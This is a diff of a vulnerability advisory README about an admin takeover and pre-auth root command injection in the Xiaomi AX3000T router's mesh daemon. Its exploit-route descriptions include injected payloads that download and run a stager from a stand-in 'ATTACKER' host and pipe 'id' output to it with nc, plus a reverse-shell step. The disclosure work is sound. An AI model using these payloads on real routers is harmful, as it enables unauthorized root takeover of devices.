@@ -1,15 +1,13 @@
 # Xiaomi AX3000T (RD03v2) — `cab_meshd` admin takeover and pre-auth root RCE
 
 An adjacent client that can reach an initialized CAP's `cab_meshd` can obtain
-**web-admin access without the admin password** (V1). On RD03v2 stock 2.0.28,
-we also demonstrated V1-assisted V2 delivery to an interactive root shell after minimal
-initialization left `NETMODE` unset. Normal Xiaomi web setup can instead set
-`NETMODE=whc_cap`, which blocks the demonstrated `cap_init` root path. The root
-callback and interactive shell were confirmed on physical hardware in the
-gate-open state; reachability after ordinary web setup has not been shown. A
-separate factory-reset path allows an attacker on the WAN-side
-L2 segment to impersonate a CAP and drive the uninitialized RE client directly to
-root command execution, without V1, an admin session, or `init_router.py`.
+**web-admin access without the admin password** (V1). V2 is a separate root command
+injection in Xiaomi's mesh initialization scripts. On RD03v2 stock 2.0.28 it was
+confirmed on hardware through two exploit routes: a direct V2 RE/WAN attack against
+a factory-reset router, and a combined V1 → V2 CAP/UCI attack against a deliberately
+prepared, gate-open CAP. The direct V2 CAP/LAN primitive was confirmed in emulation.
+Normal Xiaomi setup can set `NETMODE=whc_cap`, which blocks the demonstrated CAP
+sink; reachability from that ordinary configured state has not been shown.
 
 > ### Published 2026-09-28
 >
@@ -17,8 +15,8 @@ root command execution, without V1, an admin session, or `init_router.py`.
 > Xiaomi on **2026-08-14** on a stated 45-day timeline. Nothing is patched.
 >
 > **It ships working proof-of-concept code for both hardware-confirmed root
-> paths** — the initialized, gate-open V1-assisted OTA delivery and the factory
-> RE/WAN path —
+> routes** — the direct factory RE/WAN exploit and the combined, gate-open
+> V1 → V2 CAP/UCI exploit —
 > because for the analysed model, the **Xiaomi AX3000T
 > (`RD03v2`)**, escaping to OpenWrt is the only path off the vulnerable firmware, and
 > the exploit is what makes that install possible without opening the case. That
@@ -104,81 +102,68 @@ The enabling design flaws:
 
 ---
 
-## V2 — unauthenticated root RCE (confirmed on hardware)
+## V2 — root command injection in mesh initialization
 
-The implemented CAP-side V2 PoC repeats the forgeable mesh authentication and
-state progression that V1 uses, but V1 never reaches the root `eval`. V1 stops
-after receiving the CAP's type-6 config sync and uses the leaked verifier to mint
-an admin session. In the V1-assisted V2 path, that session plants full-length
-Wi-Fi configuration payloads; a separate, tested `type-4→5→7` exchange invokes
-`cap_init` and carries those values into `mimesh_init.sh:717`'s `eval`. The type-7
-handler itself does not require `ST_RUNNING`; the PoC retains the full validated
-exchange. This produces an
-**over-the-air root RCE** with an interactive root shell and was
-**confirmed end-to-end on physical RD03v2 hardware after the minimal
-`init_router.py` setup left `NETMODE` unset**. The normal Xiaomi setup path can
-set `whc_cap`, which gates this sink; a non-reset bypass from that state has not
-been demonstrated.
+V2 is one vulnerability: attacker-controlled mesh initialization values reach
+`mimesh_init.sh:717`'s root shell `eval`. The repository demonstrates three
+exploit routes to that sink. Two are V2-only; the third deliberately combines V1
+and V2.
 
-Separately, a factory-reset RD03v2 starts `cab_meshd -C` after runtime port
-assignment gives the DHCP WAN a nonempty interface name. A rogue CAP on that WAN
-L2 segment can answer discovery, authenticate with the firmware-global `x` key,
-and deliver a type-6 `re_init` payload. Although it enters through `re_init`
-rather than `cap_init`, it converges on the same V2 root `eval`. This direct path
-needs no V1, web login, admin API call, or prior initialization.
+### One sink, three exploit routes
 
-### V1-assisted OTA CAP delivery
+| Exploit route | Relationship | Target state and attacker position | Validation |
+|---|---|---|---|
+| **Direct V2 RE/WAN** (`re_wan_rce.py`) | V2 only; no V1, admin session, or `init_router.py` | Factory-reset router; attacker on the selected WAN-side L2 segment | Hardware: direct `uid=0(root)` callback |
+| **Combined V1 → V2 CAP/UCI** (`ota_rce.py`) | V1 obtains admin for the API/UCI plant; V2 executes the stored values | Deliberately prepared, gate-open CAP; attacker on main LAN / Wi-Fi | Hardware: root callback and interactive shell |
+| **Direct V2 CAP/LAN** (`rce_poc.py`) | V2-only research primitive | Initialized, gate-open CAP; attacker on main LAN / Wi-Fi | Emulation: about four command characters |
 
-**Demonstrated preparation:** factory-reset the router, run
-`poc/init_router.py --host 192.168.31.1 --reboot`, and verify that it returns as
-an initialized CAP with `INITTED=YES` and `NETMODE` unset. This laboratory setup
-is required before `ota_rce.py` can reach the tested CAP listener; it is not part
-of V1 or V2 and does not represent a capability demonstrated against a normally
-configured router.
+V1 never reaches the root `eval`: it ends after the type-6 verifier leak. Only the
+combined route uses V1, and there it supplies the admin session for a later UCI
+payload plant. See [`v2-root-rce.md`](v2-root-rce.md) for the complete mechanisms,
+payload construction, and evidence boundaries.
 
-1. V1 leaks `web_passwd256` over Wi-Fi → mints an admin `stok`.
-2. Admin API (`set_wifi_without_restart`) plants command-injection payloads into the
-   `encryption` UCI keys for the 2.4 GHz and 5 GHz bands. `encryption` does pass
-   through `hackCheck`; the working payload avoids its blocked bytes
-   (backtick, ``;|$&`` and newline) and instead uses permitted `\"`, spaces, and
-   `#`. Hardware read-back confirmed both values were stored verbatim. The plant
-   preserves the SSID and does not restart the radios; the later trigger briefly
-   drops Wi-Fi during reconfiguration.
-3. A `type-4→5→7` trigger fires `cap_init`. Inside `do_cap_init`,
-   `mgmt_2g=$(uci get wireless.<iface>.encryption)` reads the poisoned value
-   **raw** (not base64-laundered) and passes it into `mimesh_init.sh:717`'s `eval`.
-4. The injected `\" wget http://ATTACKER/s -O /tmp/x #` breaks out of the
-   `parse_json` quoting via `\"`→`"` un-escaping. `eval` becomes
-   `mgmt_2g="" wget … #"…` — the shell assignment-prefix trick runs `wget` as root.
-   The 5 GHz band carries `\" sh /tmp/x #`, executing the downloaded stager.
-5. The stager calls back (`uid=0`), restores valid `psk2` encryption, and starts a
-   background reconnecting reverse shell. It survives the radio reconfiguration,
-   but no boot persistence is installed. The AP briefly drops, then returns with
-   the repaired WPA2 configuration.
+### Direct V2 RE/WAN exploit
 
-- **No small field-specific payload cap was found** for `encryption`; ordinary
-  HTTP, nginx, UCI, shell, and process limits still apply.
-- **Confirmed on physical hardware**: root callback (`uid=0_user=root`), interactive
-  BusyBox ash root shell, full `netstat -tlnp`, device model `RD03v2`.
-- **CWE-78.** → [`v2-root-rce.md`](v2-root-rce.md)
+A factory-reset RD03v2 starts `cab_meshd -C` after runtime port assignment gives
+the DHCP WAN a nonempty interface name. A rogue CAP on that L2 segment can answer
+discovery, complete the reversed mesh authentication, and deliver a type-6
+`re_init` payload. The hardware test executed `` `id|nc ATTACKER 80` `` as
+`uid=0(root)`.
 
-### Direct injection variants
+This is the simplest confirmed root route. It is effectively one-shot per factory
+reset because a completed `re_init` sets `INITTED=YES` and stops the RE daemon. The
+reliable non-overlapping payload capacities are 32 bytes in `bh_ssid` and 64 bytes
+in `bh_pswd`; the encoders permit 36/66 bytes.
 
-The `eval` sink is also reachable through two direct non-admin injection paths:
+### Combined V1 → V2 CAP/UCI exploit
 
-- **CAP/LAN variant** (initialized, gate-open router): a **~4-character** command
-  via the type-4 plant. A completed `cap_init` can set `NETMODE=whc_cap` and
-  close this path; the shell also skips `lanapmode` with `CAP_MODE=ap`. The tested
-  state had API `get_netmode=0` and UCI `NETMODE` unset.
-- **RE/WAN variant** (factory-reset router): **confirmed end-to-end on physical
-  hardware**. The router obtained a WAN DHCP lease, broadcast discovery, accepted
-  the predicted `x38d…` CAP authenticator, and executed
-  `` `id|nc ATTACKER 80` `` as `uid=0(root)`. A completed `re_init` sets
-  `INITTED=YES` and stops the RE daemon, so the path is effectively one-shot per
-  factory reset. The reliable non-overlapping field budgets are 32 bytes for
-  `bh_ssid` and 64 bytes for `bh_pswd`; the encoder itself permits 36/66 bytes.
+The hardware demonstration first factory-reset the router and ran
+`poc/init_router.py --host 192.168.31.1 --reboot`, producing an initialized CAP
+with `NETMODE` unset. This is explicit laboratory preparation, not an attacker
+capability demonstrated against a normally configured router. Xiaomi's normal
+wizard can set `NETMODE=whc_cap`, which skips the CAP sink; no non-reset bypass
+from that state was demonstrated.
 
-The V1-assisted OTA delivery permits a full payload in the tested gate-open CAP state.
+After preparation, `ota_rce.py` uses two separate mesh connections:
+
+1. **V1** leaks `web_passwd256` and mints an admin `stok`.
+2. The admin API stores full-length payloads in Wi-Fi `encryption` UCI values.
+3. A later V2 type-7 trigger invokes `cap_init`, which reads those values into the
+   root `eval`.
+
+The physical test produced a root callback and interactive shell. `cap_init`
+briefly drops Wi-Fi; the payload repairs the AP as WPA2 with the PoC's fixed key
+and starts a process-lifetime reconnecting shell. It installs no boot persistence.
+
+### Direct V2 CAP/LAN research primitive
+
+An initialized CAP in the same gate-open laboratory state also accepts a direct
+type-4 plant without V1 or an admin API call. The 19-byte field leaves room for
+roughly four command characters after positional padding and base64, so this route
+is documented as a constrained primitive. It executed through the stock daemon
+and scripts in emulation; the direct payload was not run on hardware.
+
+**CWE-78.** Full writeup: [`v2-root-rce.md`](v2-root-rce.md).
 
 ## Secondary findings
 
@@ -204,7 +189,7 @@ Presented with their evidence status — see
 README.md                    this file
 ADVISORY.md                  formal advisory (CVSS, CWEs, affected versions)
 v1-admin-takeover.md         V1 — admin takeover, full writeup
-v2-root-rce.md               V2 — root RCE paths and prerequisites, full writeup
+v2-root-rce.md               V2 sink, three exploit routes, prerequisites and evidence
 technical-appendix.md        cab_meshd internals: key, handshake, wire protocol, addresses
 secondary-findings.md        credentials (V3), download_search (V4)
 remediation.md               recommended fixes, for the vendor
@@ -223,9 +208,9 @@ poc/
   init_router.py             prepares the gate-open CAP laboratory state
   handshake.py               mesh protocol driver (auth to ST_RUNNING; dumps sync config)
   extract_admin.py           PRIMARY PoC — leak verifier -> mint admin session
-  ota_rce.py                 V1-assisted V2 CAP delivery, confirmed on hardware
-  re_wan_rce.py              direct factory RE/WAN root RCE, confirmed on hardware
-  rce_poc.py                 research PoC for the direct injection sink (CAP/LAN path)
+  ota_rce.py                 combined V1 -> V2 CAP/UCI route, confirmed on hardware
+  re_wan_rce.py              direct V2 RE/WAN exploit, confirmed on hardware
+  rce_poc.py                 direct V2 CAP/LAN research primitive, emulation
 ```
 
 ## Disclosure
